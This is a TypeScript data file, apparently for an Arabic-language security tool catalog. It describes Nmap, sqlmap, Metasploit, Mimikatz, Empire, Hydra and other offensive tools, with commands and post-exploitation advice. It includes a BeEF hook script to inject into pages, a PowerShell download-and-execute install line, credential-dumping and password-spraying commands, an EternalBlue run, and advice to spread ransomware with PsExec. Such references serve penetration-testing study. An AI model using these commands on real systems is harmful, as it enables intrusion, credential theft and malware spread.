import { Category } from '../types';

export const categoriesData: Category[] = [
    {
    name: 'فحص وتعداد (Scanning & Enumeration)',
    description: 'أدوات لتحديد المضيفين، المنافذ، الخدمات، والثغرات المحتملة.',
    tools: [
      {
        id: 'nmap',
        name: 'Nmap',
        definition: 'Nmap (Network Mapper) هي أداة مجانية ومفتوحة المصدر لفحص الشبكات والتدقيق الأمني. تعتبر المعيار الصناعي لاكتشاف المضيفين والخدمات على شبكة الكمبيوتر، وبالتالي إنشاء "خريطة" للشبكة. يستخدمها مسؤولو الشبكات وخبراء الأمن السيبراني لتحديد الأجهزة التي تعمل على شبكاتهم، واكتشاف المنافذ المفتوحة، وتحديد الخدمات التي تعمل على تلك المنافذ، والكشف عن الثغرات الأمنية المحتملة.',
        function: 'تستخدم Nmap لإجراء مسح شامل للشبكات، تحديد المضيفين النشطين، فحص المنافذ المفتوحة، وتحديد إصدارات الخدمات وأنظمة التشغيل.',
        requirements: ['نظام تشغيل (Linux, Windows, macOS)', 'صلاحيات إدارية (root/Administrator) لبعض أنواع الفحص المتقدم.'],
        installation: 'sudo apt-get update && sudo apt-get install nmap',
        run_command: 'nmap [Scan Type(s)] [Options] {target specification}',
        mitre_attack_mappings: ['T1046', 'T1040', 'T1018'],
        icon: 'network',
        post_exploitation_guidance: [
          'استخدم نتائج فحص الإصدارات (-sV) للبحث عن ثغرات معروفة (exploits) للخدمات المكتشفة.',
          'تحليل نتائج سكربتات NSE (مثل vuln) لتحديد نقاط الضعف المباشرة.',
          'استخدم المعلومات حول المنافذ المفتوحة لتوجيه الهجمات اللاحقة (مثل استهداف خدمات SMB, FTP, RDP).',
        ],
        examples: [
          {
            title: 'فحص عدواني (Aggressive Scan)',
            command: 'nmap -A target.com',
            description: 'يشغل مجموعة من الخيارات المتقدمة تشمل تحديد نظام التشغيل، والإصدارات، وفحص السكربتات، وتتبع المسار.',
            is_offensive: true
          },
          {
            title: 'فحص باستخدام سكربتات الثغرات (Vuln Scan)',
            command: 'nmap --script vuln target.com',
            description: 'يستخدم جميع السكربتات في فئة "vuln" للبحث عن ثغرات أمنية معروفة في الخدمات التي تعمل على الهدف.',
            is_offensive: true
          }
        ]
      },
      {
        id: 'masscan',
        name: 'Masscan',
        definition: 'Masscan هو ماسح منافذ TCP سريع للغاية. يمكنه فحص الإنترنت بالكامل في أقل من 5 دقائق.',
        function: 'يعمل بشكل مختلف عن الماسحات التقليدية، حيث يرسل حزم SYN بشكل غير متزامن وبسرعة هائلة.',
        requirements: ['نظام تشغيل (Linux, macOS, Windows)', 'صلاحيات إدارية (root/Administrator)'],
        installation: 'sudo apt-get install masscan',
        run_command: 'sudo masscan -p80,443 10.0.0.0/8',
        mitre_attack_mappings: ['T1046'],
        icon: 'network',
        examples: [
          {
            title: 'فحص سريع لمنفذ 80 على شبكة واسعة',
            command: 'sudo masscan 10.0.0.0/8 -p80 --rate 100000',
            description: 'يفحص كامل النطاق 10.0.0.0/8 بحثاً عن منفذ 80 المفتوح بمعدل 100,000 حزمة في الثانية.',
            is_offensive: true
          }
        ]
      },
      {
        id: 'naabu',
        name: 'Naabu',
        definition: 'Naabu هو ماسح منافذ سريع وموثوق مكتوب بلغة Go.',
        function: 'يستخدم تقنية فحص SYN لتحديد المنافذ المفتوحة بسرعة على قائمة من المضيفين.',
        requirements: ['بيئة Go'],
        installation: 'go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest',
        run_command: 'naabu -host target.com',
        mitre_attack_mappings: ['T1046'],
        icon: 'network',
        examples: [
          {
            title: 'سلسلة هجومية مع Subfinder',
            command: 'subfinder -d target.com -silent | naabu -silent',
            description: 'يقوم بالبحث عن النطاقات الفرعية للهدف ثم يمررها مباشرة إلى Naabu لفحص المنافذ المفتوحة عليها.',
            is_offensive: true
          }
        ]
      }
    ]
  },
  {
    name: 'جمع المعلومات (Recon / OSINT)',
    description: 'أدوات لجمع المعلومات من المصادر المفتوحة حول الأهداف.',
    tools: [
       {
        id: 'theharvester',
        name: 'theHarvester',
        definition: 'theHarvester هي أداة لجمع المعلومات من مصادر مفتوحة (OSINT).',
        function: 'تُستخدم في المراحل الأولى من اختبار الاختراق لجمع معلومات استخباراتية حول الهدف.',
        requirements: ['Python 3.x'],
        installation: 'sudo apt-get install theharvester',
        run_command: 'theharvester -d {target_domain} -b {source}',
        mitre_attack_mappings: ['T1592', 'T1590', 'T1596.003'],
        icon: 'generic',
        examples: [
          {
            title: 'بحث شامل باستخدام جميع المصادر',
            command: 'theharvester -d example.com -b all',
            description: 'يبحث عن معلومات حول النطاق "example.com" باستخدام جميع المصادر المتاحة.',
            is_offensive: true
          }
        ]
      },
      {
        id: 'subfinder',
        name: 'Subfinder',
        definition: 'Subfinder هو مكتشف نطاقات فرعية سلبي يقوم باكتشاف النطاقات الفرعية الصالحة للمواقع الإلكترونية.',
        function: 'مصمم للسرعة، ويستخدم مصادر سلبية متعددة لضمان أقصى تغطية ممكنة.',
        requirements: ['بيئة Go'],
        installation: 'go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',
        run_command: 'subfinder -d example.com',
        mitre_attack_mappings: ['T1590.002'],
        icon: 'web',
        examples: [
          {
            title: 'البحث عن نطاقات فرعية لهدف',
            command: 'subfinder -d example.com',
            description: 'يقوم بجمع النطاقات الفرعية للنطاق المحدد باستخدام المصادر الافتراضية.',
            is_offensive: false
          },
        ]
      },
      {
        id: 'sherlock',
        name: 'Sherlock',
        definition: 'أداة للبحث عن حسابات مستخدمين عبر عدد كبير من الشبكات الاجتماعية.',
        function: 'تساعد على تجميع البصمة الرقمية لشخص ما من خلال البحث عن اسم مستخدم معين عبر مئات المواقع.',
        requirements: ['Python 3.x'],
        installation: 'git clone https://github.com/sherlock-project/sherlock.git && cd sherlock && python3 -m pip install -r requirements.txt',
        run_command: 'python3 sherlock <username>',
        mitre_attack_mappings: ['T1593.001'],
        icon: 'social',
        examples: [
          {
            title: 'البحث عن اسم مستخدم',
            command: 'python3 sherlock john_doe',
            description: 'يبحث عن حسابات باسم "john_doe" في جميع الشبكات الاجتماعية المدعومة.',
            is_offensive: false
          }
        ]
      },
    ]
  },
  {
    name: 'اختبار تطبيقات الويب (Web App Testing)',
    description: 'أدوات متخصصة في اكتشاف واستغلال الثغرات الأمنية في تطبيقات ومواقع الويب.',
    tools: [
       {
        id: 'burpsuite',
        name: 'Burp Suite Community',
        definition: 'Burp Suite هي منصة متكاملة لاختبار أمان تطبيقات الويب.',
        function: 'تستخدم كخادم وكيل (Proxy) لاعتراض طلبات HTTP/HTTPS، مما يسمح بفحص الثغرات مثل حقن SQL (SQLi) والبرمجة عبر المواقع (XSS).',
        requirements: ['Java Runtime Environment (JRE)'],
        installation: 'عادةً ما يتم تنزيله كملف JAR أو مثبت من الموقع الرسمي.',
        run_command: 'java -jar burpsuite_community.jar',
        mitre_attack_mappings: ['T1190', 'T1595.002'],
        icon: 'web',
        post_exploitation_guidance: [
          'بمجرد اعتراض الطلبات، قم بتعديل المعلمات لاختبار ثغرات مثل XSS, SQLi, IDOR.',
          'استخدم وحدة "Repeater" لإرسال طلبات معدلة بشكل متكرر ودراسة استجابات الخادم.',
          'أرسل الطلبات المثيرة للاهتمام إلى "Intruder" لأتمتة هجمات التخمين (fuzzing).',
          'حلل خريطة الموقع (Site map) لاكتشاف نقاط النهاية (endpoints) المخفية أو غير المستخدمة.'
        ],
        examples: [
          {
            title: 'تشغيل الواجهة الرسومية',
            command: 'burpsuite',
            description: 'في الأنظمة التي تحتوي على اختصار، يقوم هذا الأمر بتشغيل الواجهة الرسومية للأداة مباشرة.',
            is_offensive: false
          }
        ]
      },
      {
        id: 'sqlmap',
        name: 'sqlmap',
        definition: 'sqlmap هي أداة مفتوحة المصدر تقوم بأتمتة عملية اكتشاف واستغلال ثغرات حقن SQL.',
        function: 'تتميز بمحرك كشف قوي، وتدعم مجموعة واسعة من قواعد البيانات، وتقنيات حقن متعددة.',
        requirements: ['Python 3.x'],
        installation: 'sudo apt-get install sqlmap',
        run_command: 'sqlmap -u "http://target/page.php?id=1"',
        mitre_attack_mappings: ['T1190', 'T1505'],
        icon: 'web',
        post_exploitation_guidance: [
            'بعد تأكيد الثغرة، استخدم `--dbs` لسرد قواعد البيانات، ثم `--tables` و `--columns` لتعداد بنية قاعدة البيانات.',
            'استخدم `--dump` لسحب البيانات من الجداول المحددة.',
            'جرب خيار `--os-shell` لمحاولة الحصول على قشرة نظام (system shell) إذا كانت الظروف مناسبة.',
            'استخدم `--sql-query` لتنفيذ استعلامات SQL مخصصة على قاعدة البيانات.'
        ],
        examples: [
          {
            title: 'سرد قواعد البيانات (Database Enumeration)',
            command: 'sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs',
            description: 'بعد اكتشاف ثغرة، يحاول هذا الأمر سرد جميع قواعد البيانات على الخادم.',
            is_offensive: true
          },
        ]
      },
       {
        id: 'ffuf',
        name: 'FFUF (Fuzz Faster U Fool)',
        definition: 'أداة Fuzzing سريعة لتطبيقات الويب مكتوبة بلغة Go.',
        function: 'تُستخدم لاكتشاف الموارد غير المرتبطة مباشرة (مثل الأدلة والملفات) على خادم الويب.',
        requirements: ['بيئة Go'],
        installation: 'go install github.com/ffuf/ffuf@latest',
        run_command: 'ffuf -w /path/to/wordlist -u http://target.com/FUZZ',
        mitre_attack_mappings: ['T1083', 'T1190'],
        icon: 'web',
        examples: [
          {
            title: 'البحث عن الأدلة المخفية',
            command: 'ffuf -w /usr/share/wordlists/dirb/common.txt -u http://example.com/FUZZ',
            description: 'يستخدم قائمة كلمات شائعة للبحث عن أدلة (مسارات) موجودة ولكنها غير معلنة على الخادم.',
            is_offensive: true
          },
        ]
      },
       {
        id: 'nikto',
        name: 'Nikto',
        definition: 'ماسح ثغرات أمنية مفتوح المصدر لخوادم الويب.',
        function: 'يقوم بفحص خوادم الويب بحثًا عن آلاف الملفات والبرامج النصية الخطرة، والإصدارات القديمة من البرامج.',
        requirements: ['Perl'],
        installation: 'sudo apt-get install nikto',
        run_command: 'nikto -h http://target.com',
        mitre_attack_mappings: ['T1595.002'],
        icon: 'web',
        examples: [
          {
            title: 'فحص أساسي لخادم ويب',
            command: 'nikto -h http://testphp.vulnweb.com/',
            description: 'يقوم بتشغيل مجموعة الاختبارات الافتراضية ضد الهدف المحدد.',
            is_offensive: true
          }
        ]
      },
      {
        id: 'owasp-zap',
        name: 'OWASP ZAP',
        definition: 'OWASP ZAP هو ماسح أمان لتطبيقات الويب مفتوح المصدر ومجاني.',
        function: 'يعمل كـ "man-in-the-middle proxy"، حيث يعترض كل حركة المرور بين المتصفح وتطبيق الويب.',
        requirements: ['Java Runtime Environment (JRE) 8+'],
        installation: 'sudo apt-get install zaproxy',
        run_command: 'owasp-zap',
        mitre_attack_mappings: ['T1595.002'],
        icon: 'web',
        examples: [
          {
            title: 'فحص أساسي من سطر الأوامر (Baseline Scan)',
            command: 'zap-baseline.py -t http://target.com',
            description: 'يقوم بتشغيل فحص أساسي ضد عنوان URL المستهدف لتحديد الثغرات المحتملة.',
            is_offensive: true
          }
        ]
      },
       {
        id: 'gobuster',
        name: 'Gobuster',
        definition: 'أداة سريعة تستخدم لتخمين (Brute-force) URI (الأدلة والملفات) وأسماء النطاقات الفرعية لـ DNS.',
        function: 'تستخدم لاكتشاف المحتوى المخفي على خوادم الويب، مثل صفحات الإدارة أو الملفات الحساسة التي لم يتم ربطها بشكل مباشر.',
        requirements: ['بيئة Go'],
        installation: 'sudo apt-get install gobuster',
        run_command: 'gobuster dir -u http://target.com -w /path/to/wordlist.txt',
        mitre_attack_mappings: ['T1083', 'T1590.002'],
        icon: 'web',
        examples: [
            {
            title: 'البحث عن الأدلة باستخدام قائمة كلمات شائعة',
            command: 'gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
            description: 'يفحص الموقع بحثًا عن أدلة باستخدام قائمة كلمات متوسطة الحجم وشائعة الاستخدام.',
            is_offensive: true
            }
        ]
      }
    ]
  },
  {
    name: 'أطر الاستغلال (Exploitation Frameworks)',
    description: 'منصات متكاملة لتطوير وتنفيذ وإدارة عمليات استغلال الثغرات الأمنية.',
    tools: [
       {
        id: 'metasploit',
        name: 'Metasploit Framework',
        definition: 'Metasploit هو إطار العمل الأكثر شهرة وقوة في مجال اختبار الاختراق، وهو ليس مجرد أداة واحدة بل منصة متكاملة توفر مجموعة هائلة من وحدات الاستغلال (exploits)، الحمولات (payloads)، والوحدات المساعدة (auxiliary) التي تغطي دورة حياة الهجوم بأكملها.',
        function: 'يتبع سير العمل النموذجي في Metasploit عدة مراحل: 1. جمع المعلومات باستخدام الوحدات المساعدة. 2. اختيار وحدة استغلال مناسبة للثغرة. 3. تكوين حمولة (payload)، مثل Meterpreter الذي يوفر جلسة تحكم متقدمة. 4. إطلاق الهجوم. 5. ما بعد الاستغلال، حيث يتم استخدام جلسة Meterpreter لتصعيد الامتيازات والتحرك الجانبي داخل الشبكة.',
        requirements: ['توزيعة أمنية مثل Kali Linux', 'قاعدة بيانات PostgreSQL'],
        installation: 'sudo apt-get install metasploit-framework',
        run_command: 'msfconsole',
        mitre_attack_mappings: ['T1203', 'T1059.006', 'T1570'],
        icon: 'exploit',
        post_exploitation_guidance: [
          'بعد الحصول على جلسة Meterpreter، استخدم `sysinfo` و `getuid` لجمع معلومات النظام.',
          'شغل `post/multi/recon/local_exploit_suggester` للبحث عن طرق لتصعيد الامتيازات.',
          'استخدم `run post/windows/gather/enum_shares` أو `run post/windows/gather/enum_applications` لتعداد الموارد.',
          'قم بإنشاء مسارات للتحرك الجانبي باستخدام `portfwd` أو `autoroute`.',
          'استخدم `mimikatz` (إذا كان لديك الصلاحيات المناسبة) لإلقاء بيانات الاعتماد من الذاكرة.'
        ],
        examples: [
            {
              title: 'مثال على استغلال (EternalBlue)',
              command: 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.10\nexploit',
              description: 'خطوات استغلال ثغرة EternalBlue. استخدام هذا الأمر على أي نظام بدون إذن هو عمل غير قانوني ويعتبر هجومًا مباشرًا.',
              is_offensive: true
            }
        ]
      },
      {
        id: 'beef',
        name: 'BeEF (Browser Exploitation Framework)',
        definition: 'أداة لاختبار الاختراق تركز على استغلال ثغرات متصفح الويب.',
        function: 'تقوم بربط (hooking) متصفحات الويب كـ "zombies" وتسمح بتشغيل وحدات أوامر موجهة للتحكم بها.',
        requirements: ['Kali Linux', 'Ruby'],
        installation: 'sudo apt-get install beef-xss',
        run_command: 'beef-xss',
        mitre_attack_mappings: ['T1204.001'],
        icon: 'exploit',
        examples: [
          {
            title: 'مثال على Hook URL',
            command: '<script src="http://<BEEF_IP>:3000/hook.js"></script>',
            description: 'يتم حقن هذا السكربت في صفحة ويب مستهدفة لربط أي زائر لصفحة الويب بإطار BeEF.',
            is_offensive: true
          }
        ]
      }
    ]
  },
  {
    name: 'ما بعد الاستغلال (Post-Exploitation)',
    description: 'أدوات تستخدم بعد الحصول على وصول أولي للنظام، بهدف تصعيد الامتيازات والتحرك الجانبي.',
    tools: [
      {
        id: 'mimikatz',
        name: 'Mimikatz',
        definition: 'أداة لاستخراج كلمات المرور بصيغة نص عادي، تجزئات، رموز PIN، وتذاكر Kerberos من ذاكرة نظام Windows.',
        function: 'تستخدم في مرحلة ما بعد الاستغغلال لسرقة بيانات الاعتماد وتصعيد الامتيازات داخل شبكة Windows.',
        requirements: ['صلاحيات إدارية على نظام Windows الهدف.'],
        installation: 'يتم تنزيلها كملف تنفيذي من GitHub.',
        run_command: 'mimikatz.exe',
        mitre_attack_mappings: ['T1003.001', 'T1558', 'T1555'],
        icon: 'ad',
        post_exploitation_guidance: [
          'بعد الحصول على بيانات الاعتماد، استخدمها لتسجيل الدخول إلى أنظمة أخرى في الشبكة (التحرك الجانبي).',
          'ابحث عن تذاكر Kerberos الذهبية (Golden Tickets) أو الفضية (Silver Tickets) لإنشاء وصول دائم.',
          'استخدم بيانات الاعتماد المسروقة مع أدوات مثل PsExec للوصول إلى أنظمة أخرى عن بعد.',
        ],
        examples: [
          {
            title: 'استخراج كلمات المرور من الذاكرة',
            command: 'sekurlsa::logonpasswords',
            description: 'أحد أشهر أوامر Mimikatz، يقوم بإلقاء بيانات الاعتماد للمستخدمين المسجلين دخولهم على النظام من عملية LSASS.',
            is_offensive: true
          }
        ]
      },
       {
        id: 'crackmapexec',
        name: 'CrackMapExec',
        definition: 'أداة ما بعد الاستغلال تساعد على أتمتة تقييم أمان شبكات Active Directory الكبيرة.',
        function: 'تستخدم لتمرير التجزئات، ورش كلمات المرور، وتنفيذ الأوامر على الأنظمة المستهدفة.',
        requirements: ['Python 3.x'],
        installation: 'sudo apt install crackmapexec',
        run_command: 'crackmapexec <protocol> <target> [options]',
        mitre_attack_mappings: ['T1021.002', 'T1110.001'],
        icon: 'ad',
        examples: [
          {
            title: 'رش كلمة مرور (Password Spraying)',
            command: 'cme smb 192.168.1.0/24 -u users.txt -p \'Winter2024\'',
            description: 'يحاول تسجيل الدخول إلى جميع المضيفين باستخدام قائمة من المستخدمين وكلمة مرور واحدة شائعة.',
            is_offensive: true
          }
        ]
      },
      {
        id: 'powersploit',
        name: 'PowerSploit',
        definition: 'مجموعة من وحدات PowerShell التي يمكن استخدامها للمساعدة في مراحل مختلفة من تقييم الأمان.',
        function: 'يستخدم لتعداد الشبكات، وتصعيد الامتيازات، وسرقة بيانات الاعتماد، والتحايل على ضوابط الأمان في بيئات Windows.',
        requirements: ['Windows PowerShell'],
        installation: 'IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/PowerSploit.ps1\')',
        run_command: 'Import-Module PowerSploit.psd1',
        mitre_attack_mappings: ['T1059.001', 'T1003', 'T1087'],
        icon: 'exploit',
        examples: [
          {
            title: 'تنفيذ Mimikatz من الذاكرة',
            command: 'Invoke-Mimikatz -DumpCreds',
            description: 'يقوم بتحميل وتشغيل دالة Mimikatz مباشرة في الذاكرة لتجنب الكشف من قبل برامج مكافحة الفيروسات.',
            is_offensive: true
          }
        ]
      },
      {
        id: 'bloodhound',
        name: 'BloodHound',
        definition: 'أداة تحليل رسومية لبيئات Active Directory. تساعد في كشف مسارات الهجوم المعقدة وغير المقصودة التي قد يستغلها المهاجمون لتصعيد الامتيازات.',
        function: 'تقوم بجمع البيانات من Active Directory باستخدام أداة جمع بيانات (Ingestor) مثل SharpHound، ثم تستخدم قاعدة بيانات Neo4j لعرض العلاقات بين المستخدمين، المجموعات، الأجهزة، والأذونات بشكل مرئي.',
        requirements: ['الوصول إلى بيئة Active Directory', 'Java Runtime Environment', 'Neo4j Database'],
        installation: 'sudo apt install bloodhound',
        run_command: 'neo4j console & bloodhound',
        mitre_attack_mappings: ['T1087.002', 'T1069.002'],
        icon: 'ad',
        post_exploitation_guidance: [
          'ابحث عن أقصر مسار للوصول إلى مسؤولي النطاق (Domain Admins).',
          'حدد المستخدمين الذين لديهم سيطرة على أجهزة مهمة.',
          'اكتشف جلسات المستخدمين النشطة التي يمكن استهدافها لسرقة بيانات الاعتماد.',
          'حلل علاقات الثقة بين النطاقات المختلفة لتحديد مسارات التحرك الجانبي.'
        ],
        examples: [
          {
            title: 'جمع البيانات باستخدام SharpHound',
            command: 'SharpHound.exe -c All',
            description: 'يقوم بتشغيل أداة جمع البيانات لجمع كل المعلومات المتاحة من نطاق Active Directory الحالي وحفظها في ملفات JSON.',
            is_offensive: false
          }
        ]
      }
    ]
  },
  {
    name: 'هجمات',
    description: 'أدوات لتنفيذ هجمات مباشرة، التحرك الجانبي، وتصعيد الامتيازات.',
    tools: [
      {
        id: 'psexec',
        name: 'PsExec',
        definition: 'أداة من مجموعة Sysinternals تسمح بتنفيذ العمليات عن بعد على أنظمة ويندوز أخرى.',
        function: 'تستخدم بشكل أساسي للتحرك الجانبي داخل الشبكة عن طريق تنفيذ الأوامر أو تشغيل قشرة تفاعلية على نظام بعيد باستخدام بيانات اعتماد صالحة.',
        requirements: ['بيانات اعتماد صالحة (اسم مستخدم وكلمة مرور/تجزئة) على النظام الهدف', 'اتصال SMB (منفذ 445) بالنظام الهدف.'],
        installation: 'يتم تنزيلها كجزء من مجموعة PsTools من موقع Microsoft الرسمي.',
        run_command: 'psexec.exe \\\\TARGET_IP -u USERNAME -p PASSWORD cmd.exe',
        mitre_attack_mappings: ['T1569.002', 'T1021.002'],
        icon: 'ad',
        post_exploitation_guidance: [
          'بمجرد الحصول على وصول، استخدم `whoami` و `ipconfig` للتحقق من هويتك وموقعك في الشبكة.',
          'قم بنقل أدوات أخرى مثل Mimikatz أو سكربتات التعداد إلى النظام الهدف.',
          'استخدمه لنشر برامج الفدية أو البرامج الخبيثة الأخرى عبر الشبكة.'
        ],
        examples: [
          {
            title: 'تنفيذ أمر عن بعد',
            command: 'PsExec.exe \\\\192.168.1.10 -u Administrator -p P@ssword123 whoami',
            description: 'ينفذ الأمر `whoami` على الجهاز الهدف باستخدام بيانات اعتماد المسؤول.',
            is_offensive: true
          },
          {
            title: 'الحصول على قشرة نظام تفاعلية',
            command: 'PsExec.exe \\\\192.168.1.10 -u DOMAIN\\user -p Pa$$w0rd -s cmd.exe',
            description: 'يقوم بتشغيل موجه أوامر تفاعلي على الجهاز الهدف بصلاحيات النظام (SYSTEM).',
            is_offensive: true
          }
        ]
      },
      {
        id: 'linpeas',
        name: 'LinPEAS',
        definition: 'سكربت تعداد لتصعيد الامتيازات في أنظمة لينكس.',
        function: 'يقوم بالبحث عن جميع مسارات تصعيد الامتيازات المحتملة. يفحص الخدمات، الملفات ذات الأذونات الخاطئة، معلومات النواة، المهام المجدولة (cron jobs)، وغيرها الكثير، ويقوم بتلوين المخرجات لتمييز نقاط الضعف المحتملة.',
        requirements: ['وصول إلى قشرة نظام لينكس الهدف.'],
        installation: 'يتم تنزيله مباشرة من GitHub على الجهاز الهدف.',
        run_command: 'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh',
        mitre_attack_mappings: ['T1059.004', 'T1548'],
        icon: 'generic',
        post_exploitation_guidance: [
          'ركز على النتائج الملونة باللونين الأحمر والأصفر، فهي تشير إلى نقاط ضعف عالية الاحتمال.',
          'ابحث عن ملفات SUID غير المألوفة التي يمكن استغلالها.',
          'تحقق من المهام المجدولة التي تعمل بصلاحيات الجذر ويمكنك الكتابة فيها.',
          'استغل كلمات المرور الموجودة في ملفات الإعدادات أو تاريخ الأوامر.'
        ],
        examples: [
          {
            title: 'تشغيل السكربت وعرض النتائج',
            command: './linpeas.sh',
            description: 'ينفذ السكربت الذي سيقوم بفحص النظام بالكامل بحثًا عن نواقل تصعيد الامتيازات.',
            is_offensive: true
          },
          {
            title: 'توجيه المخرجات إلى ملف للتحليل لاحقًا',
            command: './linpeas.sh -a > peas_output.txt',
            description: 'يقوم بتشغيل السكربت مع جميع الفحوصات (-a) وحفظ النتائج في ملف نصي.',
            is_offensive: false
          }
        ]
      },
      {
        id: 'empire',
        name: 'Starkiller / Empire',
        definition: 'إطار عمل لما بعد الاستغلال قائم على PowerShell و Python.',
        function: 'يستخدم لإنشاء مستمعين (listeners)، وتوليد stagers، وإدارة العملاء (agents) على الأنظمة المخترقة. يوفر واجهة تحكم وسيطرة (C2) قوية مع مجموعة واسعة من الوحدات لتعداد النظام، تصعيد الامتيازات، والتحرك الجانبي. Starkiller هي الواجهة الرسومية لـ Empire.',
        requirements: ['نظام Kali Linux أو ما يعادله.', 'وصول إلى نظام الضحية لتنفيذ الـ stager.'],
        installation: 'sudo apt install powershell-empire',
        run_command: 'sudo powershell-empire server',
        mitre_attack_mappings: ['T1059.001', 'T1059.006', 'T1569.002'],
        icon: 'exploit',
        post_exploitation_guidance: [
          'استخدم الوحدات المدمجة مثل `usemodule collection/keylogger` لتسجيل ضغطات المفاتيح.',
          'استخدم `usemodule lateral_movement/invoke_psexec` للتحرك إلى أجهزة أخرى.',
          'جرب `usemodule privesc/powerup/allchecks` للبحث عن ثغرات تصعيد الامتيازات.',
          'حافظ على الاتصال بالعملاء وتجنب الكشف عن طريق تغيير إعدادات الاتصال (jitter, sleep).'
        ],
        examples: [
          {
            title: 'إنشاء Stager PowerShell',
            command: '(Empire) > usestager windows/launcher_bat\n(Empire: stager/windows/launcher_bat) > set Listener http\n(Empire: stager/windows/launcher_bat) > execute',
            description: 'خطوات داخل Empire لإنشاء ملف دفعي (batch file) يقوم بتنزيل وتشغيل عميل Empire على نظام ويندوز.',
            is_offensive: true
          }
        ]
      }
    ]
  },
  {
    name: 'هجمات كلمات المرور (Password Attacks)',
    description: 'أدوات لتخمين واختراق كلمات المرور باستخدام تقنيات متنوعة.',
    tools: [
       {
        id: 'john',
        name: 'John the Ripper',
        definition: 'أداة شائعة ومفتوحة المصدر لكسر كلمات المرور.',
        function: 'تستخدم لاستعادة كلمات المرور المفقودة من تجزئاتها. تدعم مجموعة واسعة من أنواع التجزئة.',
        requirements: ['ملف يحتوي على تجزئات كلمات المرور.'],
        installation: 'sudo apt-get install john',
        run_command: 'john [options] [password_file]',
        mitre_attack_mappings: ['T1110.002'],
        icon: 'password',
        examples: [
          {
            title: 'هجوم القاموس (Dictionary Attack)',
            command: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
            description: 'تنفيذ هجوم القاموس على ملف التجزئات المحدد باستخدام قائمة الكلمات الشهيرة rockyou.txt.',
            is_offensive: true
          }
        ]
      },
      {
        id: 'hashcat',
        name: 'Hashcat',
        definition: 'Hashcat هي أداة متقدمة لكسر كلمات المرور وتعتبر الأسرع في العالم.',
        function: 'تستغل قوة وحدات معالجة الرسومات (GPUs) لتسريع عملية التخمين بشكل هائل.',
        requirements: ['وحدة معالجة رسومات (GPU) قوية', 'تعريفات GPU محدّثة'],
        installation: 'sudo apt-get install hashcat',
        run_command: 'hashcat [options] hashes.txt',
        mitre_attack_mappings: ['T1110.002'],
        icon: 'password',
        examples: [
          {
            title: 'هجوم القناع (Mask Attack)',
            command: 'hashcat -m 1000 -a 3 hashes.txt ?d?d?d?d?d?d',
            description: 'مثال على هجوم القناع لتخمين كلمات مرور NTLM مكونة من 6 أرقام.',
            is_offensive: true
          }
        ]
      },
      {
        id: 'hydra',
        name: 'Hydra',
        definition: 'أداة سريعة وموازية لتخمين كلمات المرور عبر الشبكة.',
        function: 'تدعم العديد من البروتوكولات مثل SSH, FTP, Telnet, HTTP. تستخدم لتنفيذ هجمات القاموس ضد خدمات المصادقة عن بعد.',
        requirements: ['بروتوكول وشبكة للاتصال بالهدف.'],
        installation: 'sudo apt-get install hydra',
        run_command: 'hydra -l user -P passlist.txt <target_ip> <protocol>',
        mitre_attack_mappings: ['T1110.001', 'T1110.003'],
        icon: 'password',
        examples: [
          {
            title: 'هجوم قاموس على SSH',
            command: 'hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh',
            description: 'يحاول تخمين كلمة مرور حساب root على خادم SSH باستخدام قائمة كلمات rockyou.txt.',
            is_offensive: true
          }
        ]
      }
    ]
  },
  {
    name: 'هجمات الشبكة والتنصت (Network Attacks & Sniffing)',
    description: 'أدوات لتحليل حركة مرور الشبكة، اعتراضها، وتنفيذ هجمات عليها.',
    tools: [
       {
        id: 'wireshark',
        name: 'Wireshark',
        definition: 'Wireshark هو محلل بروتوكولات الشبكة الأكثر استخدامًا في العالم.',
        function: 'يستخدم لتحليل الشبكات واستكشاف الأخطاء وإصلاحها، وتطوير البرامج والبروتوكولات، والتعليم.',
        requirements: ['صلاحيات إدارية لالتقاط الحزم', 'بطاقة شبكة تدعم الوضع المختلط.'],
        installation: 'sudo apt-get install wireshark',
        run_command: 'wireshark',
        mitre_attack_mappings: ['T1040'],
        icon: 'network',
        examples: [
            {
              title: 'التقاط الحزم من سطر الأوامر (TShark)',
              command: 'sudo tshark -i eth0',
              description: 'يبدأ التقاط حركة المرور على واجهة الشبكة eth0 باستخدام TShark، وهي النسخة النصية من Wireshark.',
              is_offensive: false
            }
        ]
      },
       {
        id: 'bettercap',
        name: 'Bettercap',
        definition: 'إطار عمل قوي ومرن لتنفيذ هجمات "الرجل في المنتصف" (MITM) واختبارات أمان الشبكات.',
        function: 'تستخدم للتنصت على حركة المرور، وخداع ARP، وانتحال DNS، والتقاط بيانات الاعتماد، وحقن الشيفرات في الوقت الفعلي.',
        requirements: ['بيئة Go', 'صلاحيات إدارية (root)'],
        installation: 'sudo apt-get install bettercap',
        run_command: 'sudo bettercap -iface <interface>',
        mitre_attack_mappings: ['T1557', 'T1040'],
        icon: 'network',
        post_exploitation_guidance: [
          'استخدم وحدة `net.sniff` لالتقاط بيانات الاعتماد غير المشفرة (HTTP, FTP, etc.).',
          'قم بتشغيل `arp.spoof` لتوجيه حركة المرور عبر جهازك.',
          'استخدم `http.proxy` و `https.proxy` لاعتراض وتعديل طلبات الويب.',
          'جرب وحدة `ble.recon` لاستكشاف أجهزة البلوثوث منخفضة الطاقة.'
        ],
        examples: [
          {
            title: 'تشغيل واجهة الويب التفاعلية',
            command: 'sudo bettercap -iface eth0 -caplet http-ui',
            description: 'يقوم بتشغيل bettercap مع واجهة ويب رسومية على الواجهة eth0، مما يسهل إدارة الهجمات.',
            is_offensive: true
          }
        ]
      },
      {
        id: 'responder',
        name: 'Responder',
        definition: 'أداة لتسميم بروتوكولات تحليل الأسماء مثل LLMNR, NBT-NS, و mDNS.',
        function: 'عندما يفشل نظام Windows في تحديد مضيف عبر DNS، فإنه يرسل استعلامًا على الشبكة المحلية. يقوم Responder بالرد على هذا الاستعلام، مدعيًا أنه المضيف المطلوب، ويطلب من الضحية إرسال تجزئة كلمة المرور (NTLM hash) للمصادقة.',
